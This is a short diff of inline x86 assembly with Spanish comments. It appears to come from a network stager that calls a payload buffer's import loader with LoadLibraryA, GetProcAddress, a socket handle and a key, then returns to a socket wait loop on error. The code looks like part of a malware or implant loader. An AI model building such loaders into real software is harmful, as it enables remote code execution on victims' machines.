@@ -547,6 +547,8 @@ FNV1a:
         mov  eax, [ebp+_pBuff]          //v
         add  eax, 0x4                   // Saltamos hasta el cargador_IAT
         call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
+        //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
+        jmp KillSocket                  //Reiniciamos el bucle de espera
     }
 }
 
